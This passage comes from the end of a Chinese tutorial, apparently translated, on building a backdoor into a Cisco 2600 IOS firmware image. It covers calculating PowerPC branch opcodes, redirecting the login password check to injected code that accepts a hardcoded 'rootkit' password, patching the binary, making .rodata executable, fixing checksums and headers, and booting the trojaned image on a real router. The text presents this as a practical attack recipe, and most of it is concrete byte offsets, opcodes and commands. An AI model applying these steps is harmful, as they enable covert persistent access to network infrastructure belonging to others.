当我们完成了一些操作后，0x803bd534会读取bl <我们的函数地址>‖，并且如果输入的密码与rootkit密码不相等，那么就会需要发送到读取密码检查，所以我们必须要在我们的函数中手动调用―b 0x80385070‖ (always branch)。返回到IDA，前往View -> Open Subview -> Strings，单击Length，我们首先看到的就是最长的那一个。选取.rodata:81B688E0上的字符串，其长度是0x305-点对点的版权（point-to-point copyright）。在第一阶段后-从0x81B688E0开始的代码，但是我们的代码会从0x81b68928开始，我们会启动 “All”字上的代码。

![](http://static.wooyun.org//drops/20160420/2016042008352293225.com/blob/zrhaaaawpzs/rrhqb3ufjarft0qn7byaiq?s=xirkabyyk7my)

我们要如何获取要跳转的地址呢？我们需要两个，一个是0x81b68928上我们字符串/代码的分支地址，用于替换掉密码检查函数调用。另一个来自我们的函数内部，真正的密码检查函数的分支地址，如果密码与rootkit密码不匹配，并且需要发送到真正的密码检查函数时，密码检查函数就会被调用。简而言之，基础分支的操作代码是 48 00 00 00，所以我们首先编译第一个，并看看操作代码会把我们放到这一部分的什么地方。

![](http://static.wooyun.org//drops/20160420/2016042009481357435.com/blob/zrhaaaawpzs/qpregwrcowgcjaxzdyiqca?s=xirkabyyk7my)

操作代码字段是前6位，0-5位；接下来的4位是地址，6-29位；AA bit 30会判断地址是绝对地址还是相对地址，而LK bit 31会判断操作是否设置了连接寄存器。

用ht打开C2600-BI.BIN，按下F5，前往到0x3b5594（从0x3b559c向后退两条指令），并使用48 00 00 00替换4b fc 7b 3d，保存并在Dynamips中启动，然后通过GDB连接，并观察这里的地址是什么。

![](http://static.wooyun.org//drops/20160420/2016042008352738787.com/blob/zrhaaaawpzs/vowajxgkgejkbekz9pmftq?s=xirkabyyk7my)

我们发现，使用我们的操作代码48 00 00 00来测试基础分支会得到指令b 0x803bd534，但是我们需要设置好连接寄存器，根据上面的解释，所有这些操作最终会把最后一位设置成0x1，而不是0x0，因此，为了获取到bl 0x803bd534，我们设置的操作代码必须要是48 00 00 01。

我们已经决定让我们的代码从0x81b68928开始，这个位置是ALL字在点对点版权字符串上的开始地址。我们的基础分支指令会把我们放到0x803bd534，而我们必须要到达0x81b68928。所以，我们需要搞明白其差值，然后加到我们的基础分支操作上。

![](http://static.wooyun.org//drops/20160420/2016042008352987988.com/blob/zrhaaaawpzs/e9zr1qft05hd9b9o0bnpqq?s=xirkabyyk7my)

这样相加造成的结果就是bit 31没有设置，但是我们需要设置这一位，所以，我们还要再次把最后一位从0x0设置为0x1，得到十六进制值0x497ab3f5，这样我们的操作代码会分支到我们的代码开始位置：―49 7a b3 f5。我们的操作代码0x497ab3f5会从 0x803bd534跳转到我们的字符串地址0x81b68928。再次在ht中打开C2600-BI.BIN，按F5，并输入地址 0x3b5594，把字节设置成49 7a b3 f5，保存并加载到GDB。

![](http://static.wooyun.org//drops/20160420/2016042008353291607.com/blob/zrhaaaawpzs/2-kxyxepz9jzyksagcb2fq?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042008353423678.com/blob/zrhaaaawpzs/_4bo6hjxwwpnz7uhtlkfba?s=xirkabyyk7my)

接下来是我们的字符串对比函数。我会尝试尽可能简单地解释，没有任何技巧或计数器，所以所有人都能看懂。我们会汇编并连接这个函数，然后在函数上放入从 0x81b68928开始的字节。

![](http://static.wooyun.org//drops/20160421/2016042104462046274.com/blob/zrhaaaawpzs/mtw2ice9_vn0l9h3jbfiog?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042008354047555.com/blob/zrhaaaawpzs/nspmojobjoxtweajpvcasw?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160421/2016042102512641413.com/blob/zrhaaaawpzs/qdnxpubs-qvjemrze-ahig?s=xirkabyyk7my)

我写的这些东西可以用于本地测试。但是我们想在真实环境中来感染登录函数，所以，我们需要从头再来，一直到最后的rootkit密码，最后，在rkPass后以00 00 00 00结束。我们需要汇编和连接我写的这个东西，然后使用objdump来转储我们需要的字节，然后替换成我们的字节。

在看到了地址`b 0x00000000`后，我们决定要弄明白在这里都发生了什么。首先，使用和前面相同的方法，明确点对点字符串上的 “All”字对应在objdump中的什么位置：用字符串0x81b68928的位置地址减去0x8000800的基址，加上objdump 0x60中代码的起始位置偏移。

![](http://static.wooyun.org//drops/20160420/2016042008354691150.com/blob/zrhaaaawpzs/eonnycgdc4mtrks2irvvja?s=xirkabyyk7my)

首先编译和连接rootkit.s代码，然后把我们需要的字节转储到一个补丁文件。

![](http://static.wooyun.org//drops/20160420/2016042008354859825.com/blob/zrhaaaawpzs/-sebp2xz119b0wkguveubg?s=xirkabyyk7my)

如果你在汇编和连接后的文件上执行一个`objdump -D rootkit`，你会发现我们需要输出中从偏移10000054 开始，在100000e0结束的字节。然后，我们取出这些字节，并把这些字节发送到我们的补丁文件。之后，在Debian PowerPC虚拟机上把你的 rootkit.patch文件scp到你的主开发虚拟机。

通过我们前面的计算，我们知道 rootkit.patch必须写入到偏移 0x1b60988上的C2600-BI.BIN文件。为此，我们写了一个简单的Python脚本来完成这项操作。rootkit.patch 和 C2600-BI.BIN 文件必须要在同一个目录下，你的文件名也要和我们的一样。

![](http://static.wooyun.org//drops/20160420/2016042008355166626.com/blob/zrhaaaawpzs/fqq25htvdgmhcaiuicv76q?s=xirkabyyk7my)

再次使用ht打开新打了补丁的C2600-BI.BIN文件，按下F5并输入地址0x1b60988，验证这个补丁已经正确地应用了。

![](http://static.wooyun.org//drops/20160420/2016042008355476140.com/blob/zrhaaaawpzs/perjpzld_0rlhagcxmsuew?s=xirkabyyk7my)

接着，在Dynamips中启动文件，并通过GDB连接，检查字节，并验证我们的代码已经放在那里了。

![](http://static.wooyun.org//drops/20160420/2016042008355680345.com/blob/zrhaaaawpzs/nmguxfpu7eci6umkgof0lq?s=xirkabyyk7my)

*注意，我们没有在这里提供完整显示。

对于这个补丁而言，最后要做的是修复汇编代码中虚假的位置分支 -b 0x00000000，分支到我们早前放置好的真正的密码检查函数，应该是`b 0x80385070`。现在，分支在 0x81b689a0上，而我们想让这个分支到0x80385070上。

![](http://static.wooyun.org//drops/20160420/2016042008355935835.com/blob/zrhaaaawpzs/4wd8h2p-y6tpovuvdgotpg?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042008360156890.com/blob/zrhaaaawpzs/rel20c-lp203biswufyw2q?s=xirkabyyk7my)

再次用ht打开C2600-BI.BIN，前往地址0x1b60a00，并使用我们计算出来的新分支操作代码和地址替换掉字节48 00 00 00。不过，这样说有点简单：

![](http://static.wooyun.org//drops/20160420/2016042008360374379.com/blob/zrhaaaawpzs/a21kvfp_9xzlr12lj6razq?s=xirkabyyk7my)

找到负分支地址：

```
<lower address> - <higher address>获取结果中的后26位，并前置0y010010

```

找到正分支地址：

```
<higher address> - <lower address> 获取结果并加上0x48000001 

```

最后要做的就是让我们字符串所在的这一部分变成可执行的。我们从IDA中知道，这个数据部分是只读的。在ht中打开，按F6，选择elf/header，向下滚动到machine，把类型从SPARC 002b设置为PowerPC 0014，并保存。然后使用objdump把这一部分设置成可执行的。

```
PowerPC 0014, and save it. Then use objcopy to set the section executable. 
[ 3812149161f@decay ]# objcopy -F elf32-powerpc --set-section-flags .rodata=alloc,code C2600-BI.BIN C2600-BI.BIN.ROEXEC

```

在ht中打开C2600-BI.BIN.ROEXEC，把机器类型从PowerPC 0014设置回SPARC 002b，在Dynamips中启动，通过GDB连接；然后继续。首先尝试用常规密码登录，然后用我们设置的新后门密码rootkit登录。如果你在登录的时候遇到问题，则返回并检查每个步骤。通过下面的步骤来检查故障。

1.  在修改了字节后，你有没有启动一个新的C2600-BI.BIN ？
2.  所有的分支地址都正确吗？
3.  所有的分支操作代码，包括连接寄存器都放在需要的位置了吗，并且检查有没有出现在不该出现的位置？ 4.在Dynamips中启动IOS，使用GBD连接，在继续启动前，检查指令： x/i 0x803bd53c, x/i 0x803bd534, x/35i 0x81b68928。
4.  在b *0x81b6899c, b *0x81b689a0, b *0x803bd538, b *0x803bd534上设置一些断点，在最后的断点上检查x/s r3, x/s r4中的字符串，确保你输入的密码和路由器预期的密码是这些寄存器指定的。

![](http://static.wooyun.org//drops/20160420/2016042008360543964.com/blob/zrhaaaawpzs/xspmpx1mmvqffsu0obt4sg?s=xirkabyyk7my)

现在，我们的rootkit已经能在Dynamips中运行了，是时候重新创建IOS二进制了，然后把我们的rootkit上传到一个真实的路由器中，测试一下。首先，我们必须要压缩C2600-BI.BIN.ROEXEC，我发现最好的方式不是使用zip程序，因为这样可能会添加上错误的字节，而是用一个简单的Python脚本，如下：

![](http://static.wooyun.org//drops/20160420/2016042009481994108.com/blob/zrhaaaawpzs/wpxhcrpieb7opdecr8ob7a?s=xirkabyyk7my)

接下来我们必须计算未压缩和压缩后的镜像大小，并给镜像生成校验和。

```
[ 3812149161f@decay ]# ./chksum.pl C2600-BI.BIN.ROEXEC.zip

```

[!] 计算文件C2600-BI.BIN.ROEXEC.zip的校验和

![](http://static.wooyun.org//drops/20160420/2016042009482180999.com/blob/zrhaaaawpzs/qphtybzki2zdu8rfwd_rbw?s=xirkabyyk7my)

[!] 计算文件 C2600-BI.BIN.ROEXEC的校验和

![](http://static.wooyun.org//drops/20160420/2016042008361022053.com/blob/zrhaaaawpzs/iymftsntqx2x8vcordbfyw?s=xirkabyyk7my)

我们要把下面的值放入到标头中魔术数字0xfeedface的后面：

0265e288 未压缩的镜像大小  
00ea53de 压缩后的镜像大小  
4d955cec 压缩后的镜像校验和  
c4e7e7c0 未压缩的镜像校验和

接下来cat镜像标头，然后二进制打印4个字节，最后cat zip文件。

![](http://static.wooyun.org//drops/20160420/2016042008361278941.com/blob/zrhaaaawpzs/is79ultl8f84xaqd9fm-jw?s=xirkabyyk7my)

在上传我们的IOS木马镜像到真实的路由器并启动之前，我们最后还要更改SFX标头中的大小。

![](http://static.wooyun.org//drops/20160420/2016042009482439468.com/blob/zrhaaaawpzs/yk-34hansebk3wqgplxfna?s=xirkabyyk7my)

zip大小加20，用于涵盖0xfeedface，镜像大小，未压缩的镜像大小，镜像校验和和未压缩的镜像校验和。

![](http://static.wooyun.org//drops/20160420/2016042008361559501.com/blob/zrhaaaawpzs/csgfejmc9tsljwwv61xjeq?s=xirkabyyk7my)

在ht中打开，按下F5，并前往偏移 0x108，输入我们新计算的00 ea 53大小，按F2，保存，并退出ht。

```
[ 3812149161f@decay ]# mv trojan.bin c2600-trojan-mz.123-22.bin

```

现在把rootkit上传到一个真正的路由器并重新载入：

![](http://static.wooyun.org//drops/20160420/2016042012584528346.com/blob/zrhaaaawpzs/wf9iblddepypudqubd_izw?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042009482924693.com/blob/zrhaaaawpzs/sehxe5ouocsbznjtbjmy0w?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042008362328803.com/blob/zrhaaaawpzs/qjijk4bxw378nw_pobh14a?s=xirkabyyk7my)

如果上述中的任何内存要求中出现了 “未知”，那么说明你可能使用了一种不受支持的配置，或者存在软件问题，并且系统损坏了。

![](http://static.wooyun.org//drops/20160420/2016042012584795607.com/blob/zrhaaaawpzs/gei5l7d9cczdg8cldygloq?s=xirkabyyk7my)

![](http://static.wooyun.org//drops/20160420/2016042008362756267.com/blob/zrhaaaawpzs/1g098pqvoikq5kylrur4iq?s=xirkabyyk7my)

0x04 结论
=====

现在，你可以看到，我们能使用管理员配置的密码或我们的后门密码来登录了。尽管很基础，但是本文展示了在开发更高级功能时，不可缺少的所有必要组件。其他的一些人也展示过了另外需要的一些技术来做别的事，比如使用字符串引用来识别高级功能所需要的函数，创建一个有权限的绑定shell，创建一个新的权限VTY/TTY，添加或移除VTY上的密码要求，创建一个有权限的逆向shell，以及更多。你只需要花点时间，看看文章和在线教程，然后使用在这里学到的基础知识来应用它们。我们希望本文中展示的IOS二进制修改技术与其他的固件修改相比，并不复杂。现在是时候消化这些结论，并通过跟踪，调试和字符串引用来理解这些函数。这里面没有什么魔法，也不需要国家作为代码来源，也没有涉及什么机密的高级技术。要想修改一台Cisco设备的固件二进制，只需要基础的编码知识，与目标架构相关的汇编语言知识，大致了解反汇编，另外还需要时间和兴趣。